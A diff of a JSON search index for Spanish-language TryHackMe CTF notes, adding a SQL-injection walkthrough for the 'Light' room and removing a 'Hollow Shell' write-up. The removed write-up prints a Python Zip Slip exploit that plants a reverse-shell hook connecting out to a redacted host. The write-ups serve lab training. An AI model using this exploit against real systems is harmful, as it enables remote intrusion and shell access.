@@ -1,42 +1,42 @@
 [
   {
+    "title": "1. Easy",
+    "path": "/apuntes/thm/maquinas/1-easy/1-easy/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/1. Easy.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy",
+    "content": "1. [[Ciberseguridad/THM/Maquinas/1. Easy/1. Vulnerability Capstone/0. Vulnerability Capstone]]\n2. [[Ciberseguridad/THM/Maquinas/1. Easy/2. Pickle Rick/0. Pickle Rick]]\n3. [[0. Lookup]]\n4. [[0. Res]]\n5. [[0. Brooklyn Nine Nine]]\n6. [[0. TakeOver]]\n7. [[0. Overpass]]\n8. [[0. Publisher]]\n9. [[0. MD2PDF]]\n10. [[0. Basic Pentesting]]\n11. [[0. RootMe]]\n12. [[0. OhSINT]]\n13. [[0. Simple CTF]]\n14. [[0. Bounty Hacker]]\n15. [[0. Agent Sudo]]\n16. [[0. LazyAdmin]]\n17. [[0. Cyborg]]\n18. [[0. Skynet]]\n19. [[0. Startup]]\n20. [[0. Tomghost]]\n21. [[0. GamingServer]]\n22. [[0. Ignite]]\n23. [[0. Brute It]]\n24. [[0. Wgel CTF]]\n25. [[0. Anthem]]\n26. [[0. CTF collection Vol. 1]]\n27. [[0. Chill Hack]]\n28. [[0. Year of the Rabbit]]\n29. [[0. Lian_Yu]]\n30. [[0. Fowsniff CTF]]\n31. [[0. Easy Peasy]]\n32. [[0. Chocolate Factory]]\n33. [[0. Source]]\n34. [[0. Neighbour]]\n35. [[0. Agent T]]\n36. [[0. Poster]]\n37. [[0. VulnNet - Internal]]\n38. [[0. ColddBox - Easy]]\n39. [[0. Corridor]]\n40. [[0. Archangel]]\n41. [[0. Dig Dug]]\n42. [[Ciberseguridad/THM/Maquinas/1. Easy/42. BankGPT/0. BankGPT]]\n43. [[Ciberseguridad/THM/Maquinas/1. Easy/43. HealthGPT/0. HealthGPT]]\n44. [[0. Mustacchio]]\n45. [[0. Smart Grotto]]\n46. [[0. Tech_Supp0rt-1]]\n47. [[0. Team]]\n48. [[0. Gallery]]\n49. [[0. Checkmate]]\n50. [[0. Anonforce]]\n51. [[0. W1seGuy]]\n52. [[0. CyberHeroes]]\n53. [[0. Fools Mate]]\n54. [[0. Light]]\n55.",
+    "modified": "2026-08-26T00:35:57"
+  },
+  {
+    "title": "2. Getting the Flags",
+    "path": "/apuntes/thm/maquinas/1-easy/54-light/2-getting-the-flags/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/54. Light/2. Getting the Flags.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 54. Light",
+    "content": "<h2>Reconocimiento Inicial</h2>\nComenzamos realizando un escaneo de puertos abiertos.\n\n![[Pasted image 20260825183504.png]]\n\nAhora escaneamos más a fondo los puertos abiertos.\n\n![[Pasted image 20260825183528.png]]\n\n------------------------\n<h2>Profundización</h2>\nVamos a ver qué hay en el puerto `1337`.\n\n![[Pasted image 20260825183720.png]]\n\nParece que nos da la contraseña del usuario, ahora vamos a tratar de conseguir el username del administrador.\n\n![[Pasted image 20260825184440.png]]\n\nCuando ponemos un usuario inexistente, la aplicación nos devuelve `Username not found.`, esto significa que la aplicación está haciendo una query para mirar nombres de usuarios del estilo:\n\n```sql\nSELECT password FROM users WHERE username=input\n```\n\nEsto significa que puede que exista una vulnerabilidad de tipo SQLi. Para comprobarlo introducimos una `'`.\n\n![[Pasted image 20260825184848.png]]\n\nY efectivamente confirmamos las sospechas.\n\n--------------------------------\n<h2>Explotación</h2>\nVamos a intentar explotarla. Como parece que sigue ejecutando la query después de la comilla vamos a intentar introducir un comentario.\n\n![[Pasted image 20260825185037.png]]\n\nParece que los comentarios están filtrados, vamos a ver cómo bypassearlo.\n\n![[Pasted image 20260825185214.png]]\n\nParece que puede ser la palabra clave `SELECT` la que \"no le gusta\".\n\n![[Pasted image 20260825185422.png]]\n\nParece que no puede ejecutar varias queries en una única línea y por eso se queda colgada. Vamos a probar con `UNION SELECT`.\n\n![[Pasted image 20260825185650.png]]\n\nEn SQL, el operador `>` es un comparador que devuelve todo lo que coincida después de la string. Como en la primera comilla dejamos una aislada, cuando ponemos la última la string queda vacía (`SELECT * FROM users WHERE username > ''`). A efectos prácticos, esto nos devuelve todos los nombres. Sin embargo aquí nos topamos con el siguiente problema, que es que no conocemos el nombre de las tablas. Vamos a averiguarlos.\n\n![[Pasted image 20260825190551.png]]\n\nDespués de probar varios payloads encontramos el que nos funciona. Así obtenemos los nombres de las tablas. Ahora toca extraer lo que necesitamos.\n\n![[Pasted image 20260825190733.png]]\n\nAsí obtenemos el nombre del administrador.\n\n![[Pasted image 20260825191142.png]]\n\nCon esta otra query encontramos la flag. Pero nos falta la contraseña, por lo que vamos a obtener la contraseña.\n\n![[Pasted image 20260825191210.png]]",
+    "modified": "2026-08-26T00:35:57"
+  },
+  {
+    "title": "1. Introduction",
+    "path": "/apuntes/thm/maquinas/1-easy/54-light/1-introduction/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/54. Light/1. Introduction.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 54. Light",
+    "content": "![[Pasted image 20260825181443.png]]\n\nBienvenido a la aplicación de base de datos Light.\n\nEstoy trabajando en una aplicación de base de datos llamada Light. ¿Te gustaría probarla?\nSi es así, la aplicación se ejecuta en el puerto 1337. Puedes conectarte usando `nc 10.80.136.72 1337`.\nPuedes usar el nombre de usuario `smokey` para empezar.",
+    "modified": "2026-08-26T00:35:57"
+  },
+  {
+    "title": "0. Light",
+    "path": "/apuntes/thm/maquinas/1-easy/54-light/0-light/",
+    "src": "content/Ciberseguridad/THM/Maquinas/1. Easy/54. Light/0. Light.md",
+    "breadcrumb": "THM > Maquinas > 1. Easy > 54. Light",
+    "content": "[[Ciberseguridad/THM/Maquinas/1. Easy/54. Light/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/1. Easy/54. Light/2. Getting the Flags]]",
+    "modified": "2026-08-26T00:35:57"
+  },
+  {
     "title": "2. Medium",
     "path": "/apuntes/thm/maquinas/2-medium/2-medium/",
     "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/2. Medium.md",
     "breadcrumb": "THM > Maquinas > 2. Medium",
     "content": "1. [[0. Mr. Robot CTF]]\n2. [[Ciberseguridad/THM/Maquinas/2. Medium/2. Net Sec Challenge/0. Net Sec Challenge]]\n3. [[0. Revenge]]\n4. [[0. Rabbit Store]]\n5. [[0. Ultra Tech]]\n6. [[Ciberseguridad/THM/Maquinas/2. Medium/6. Hammer/0. Hammer]]\n7. [[Ciberseguridad/THM/Maquinas/2. Medium/7. Include/0. Include]]\n8. [[Ciberseguridad/THM/Maquinas/2. Medium/8. Injectics/0. Injectics]]\n9. [[Ciberseguridad/THM/Maquinas/2. Medium/9. Whats Your Name/0. Whats Your Name]]\n10. [[Ciberseguridad/THM/Maquinas/2. Medium/10. CAPTCHApocalypse/0. CAPTCHApocalypse]]\n11. [[Ciberseguridad/THM/Maquinas/2. Medium/11. Voyage/0. Voyage]]\n12. [[Ciberseguridad/THM/Maquinas/2. Medium/12. Sequence/0. Sequence]]\n13. [[0. Wonderland]]\n14. [[Ciberseguridad/THM/Maquinas/2. Medium/14. Padelify/0. Padelify]]\n15. [[Ciberseguridad/THM/Maquinas/2. Medium/15. Farewell/0. Farewell]]\n16. [[Ciberseguridad/THM/Maquinas/2. Medium/16. Juicy/0. Juicy]]\n17. [[0. GoldenEye]]\n18. [[0. Relevant]]\n19. [[0. Dogcat]]\n20. [[0. Wekor]]\n21. [[0. Fools Mate Revenge]]\n22. [[0. Blog]]\n23. [[0. The Hollow Shell]]\n24.",
-    "modified": "2026-08-24T00:35:19"
-  },
-  {
-    "title": "0. The Hollow Shell",
-    "path": "/apuntes/thm/maquinas/2-medium/23-the-hollow-shell/0-the-hollow-shell/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/0. The Hollow Shell.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 23. The Hollow Shell",
-    "content": "[[Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/1. Introduction]]\n[[Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/2. Getting the Flags]]",
-    "modified": "2026-08-24T00:35:19"
-  },
-  {
-    "title": "2. Getting the Flags",
-    "path": "/apuntes/thm/maquinas/2-medium/23-the-hollow-shell/2-getting-the-flags/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/2. Getting the Flags.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 23. The Hollow Shell",
-    "content": "<h2>Reconocimiento Inicial</h2>\nComenzamos realizando un escaneo de puertos abiertos.\n\n![[Pasted image 20260823205533.png]]\n\nAhora vamos a escanear los puertos abiertos más en profundidad.\n\n![[Pasted image 20260823205409.png]]\n\nVamos a ver qué hay en la web.\n\n![[Pasted image 20260823205643.png]]\n\nVemos dos endpoints muy interesantes. Vamos a ver cómo se ve la web.\n\n![[Pasted image 20260823205723.png]]\n\n-----------------------------------\n<h2>Profundización</h2>\nSi miramos el código fuente podemos encontrar usuario y contraseña.\n\n![[Pasted image 20260823205812.png]]\n\nVamos a probar con dicho par para intentar obtener acceso al endpoint `/upload`, que es el más jugoso aparentemente.\n\n![[Pasted image 20260823205945.png]]\n\nHemos entrado al panel donde aparece el endpoint de subida. Vamos a investigar si hay algún tipo de filtro. Si intentamos subir un archivo `.php` nos dice lo siguiente.\n\n![[Pasted image 20260823210439.png]]\n\nVamos a crear un archivo `.zip` de prueba para ver cómo funciona la subida.\n\n![[Pasted image 20260823211427.png]]\n\nAhora probamos a subirlo.\n\n![[Pasted image 20260823211509.png]]\n\nEl mensaje ha cambiado. Vamos a la dirección que nos han dado.\n\n![[Pasted image 20260823211752.png]]\n\nAquí está.\n\n---------------------------------\n<h2>Explotación</h2>\nSabemos que está guardando las shells en un directorio `/shells/shell-id/`. Por lo que podemos inferir que los hooks se están guardando de forma similar. Hay un tipo de ataque llamado `Zip Slip` que nos permite guardar un nombre con `../../` y estos serán interpretados al descomprimirse.\n\nVamos a crear un exploit en python que nos devuelva el archivo `.zip` listo para subir.\n\n```python\nimport zipfile, json\n\npayload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[REDACTED]\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")')\n\nwith zipfile.ZipFile(\"evil.zip\", \"w\") as z:\n    z.writestr(\"shell.json\", json.dumps({\"name\": \"evil\", \"assets\": [\"style.css\"]}))\n    z.writestr(\"style.css\", \"/* test */\")\n    z.writestr(\"../../hooks/evil.py\", payload)\n\n```\n\nAhora lo ejecutamos. Y esto nos da el zip para subir. Nos ponemos en escucha:\n\n![[Pasted image 20260823214848.png]]\n\nY ahora subimos el archivo.\n\n![[Pasted image 20260823214920.png]]\n\nUna vez que el worker llega a los hooks, podemos ver que nos devuelve una shell.\n\n![[Pasted image 20260823214944.png]]\n\nY una vez allí buscamos la flag.\n\n![[Pasted image 20260823215133.png]]",
-    "modified": "2026-08-24T00:35:19"
-  },
-  {
-    "title": "1. Introduction",
-    "path": "/apuntes/thm/maquinas/2-medium/23-the-hollow-shell/1-introduction/",
-    "src": "content/Ciberseguridad/THM/Maquinas/2. Medium/23. The Hollow Shell/1. Introduction.md",
-    "breadcrumb": "THM > Maquinas > 2. Medium > 23. The Hollow Shell",
-    "content": "![[Pasted image 20260823204542.png]]\n\nLa encuentras en la playa: bonita, normal, el tipo de cosa en la que nadie se fija y comprueba. Mete algo dentro y sostenlo junto a tu oído.",
-    "modified": "2026-08-24T00:35:19"
-  },
-  {
-    "title": "7. Conclusion",
-    "path": "/apuntes/thm/1-career/2-penetration-tester/5-red-teaming/6-compromising-active-directory/4-lateral-movement-and-pivoting/7-conclusion/",
-    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/5. Red Teaming/6. Compromising Active Directory/4. Lateral Movement and Pivoting/7. Conclusion.md",
-    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 5. Red Teaming > 6. Compromising Active Directory > 4. Lateral Movement and Pivoting",
-    "content": "",
     "modified": "2026-08-24T00:35:19"
   }
 ]
